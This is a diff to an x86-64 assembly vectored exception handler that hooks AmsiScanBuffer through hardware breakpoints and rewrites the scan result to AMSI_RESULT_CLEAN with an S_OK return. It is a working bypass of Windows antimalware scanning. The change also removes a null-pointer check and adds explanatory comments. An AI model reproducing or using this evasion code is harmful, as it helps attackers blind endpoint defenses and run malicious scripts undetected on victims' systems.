@@ -2,11 +2,18 @@
 
 ; nasm -f bin veh.asm -o veh.bin ; xxd -i veh.bin
 
+    ; Callback called w/ 
+    ;   typedef struct _EXCEPTION_POINTERS {
+    ;     PEXCEPTION_RECORD ExceptionRecord;
+    ;     PCONTEXT          ContextRecord;
+    ;   } EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;
+
     ; rcx = PEXCEPTION_POINTERS
     mov r8, [rcx + 8]   ; r8 = ContextRecord
     mov r9, [rcx]       ; r9 = ExceptionRecord
-    mov eax, [r9]       ; eax = ExceptionCode
+    mov eax, [r9]       ; eax = ExceptionCode 
 
+    ; exception Code details : https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-exception_record#members
     cmp eax, 0x80000003 ; EXCEPTION_BREAKPOINT (int 3)
     je handle_bp
     cmp eax, 0x80000004 ; EXCEPTION_SINGLE_STEP (HWBP hit)
@@ -47,14 +54,10 @@
         ; [RSP] = ret addr, [RSP+0x8 to 0x20] = shadow space, [RSP+0x28] = 5th arg, [RSP+0x30] = 6th arg
         mov r12, [r11 + 0x30]    ; r12 = pointer to AMSI_RESULT
 
-        ; Sanity check to avoid access violation if pointer is null
-        test r12, r12
-        jz skip_result
+        ; See doc : https://learn.microsoft.com/fr-fr/windows/win32/api/amsi/ne-amsi-amsi_result
+        ; Set AMSI_RESULT to AMSI_RESULT_CLEAN (0) to simulate a clean scan
+        mov dword [r12], 0
 
-        ; Set AMSI_RESULT to AMSI_RESULT_NOT_DETECTED (1) to simulate a clean scan
-        mov dword [r12], 1
-
-skip_result:
         ; Set ret value of AmsiScanBuffer to S_OK (0) 
         mov dword [r8 + 0x68], 0 ; r8 + 0x68 = Rax of the context record (return value of AmsiScanBuffer)
 
